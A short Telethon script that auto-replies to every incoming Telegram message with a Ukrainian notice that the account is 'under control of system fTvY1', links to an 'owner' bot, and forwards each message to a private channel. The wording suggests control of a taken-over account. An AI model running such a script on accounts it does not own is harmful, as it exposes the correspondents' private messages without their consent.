from telethon import TelegramClient, events

api_id = 123456
api_hash = "API_HASH"

# Канал куди пересилати всі повідомлення
channel = "https://t.me/+BraoQaofzgE5OWZi"

# Посилання на власника, куди людина може написати
owner_link = "https://t.me/fTvY1System_bot"

client = TelegramClient("session", api_id, api_hash)

@client.on(events.NewMessage(incoming=True))
async def handler(event):

    # 1️⃣ Надсилаємо автовідповідь користувачу
    await event.reply(
        f"⚠️ Аккаунт під контролем системи: fTvY1\n\n"
        f"Зв'язок з власником: {owner_link}"
    )

    # 2️⃣ Пересилаємо точну копію повідомлення у канал
    await event.forward_to(channel)

client.start()
client.run_until_disconnected()
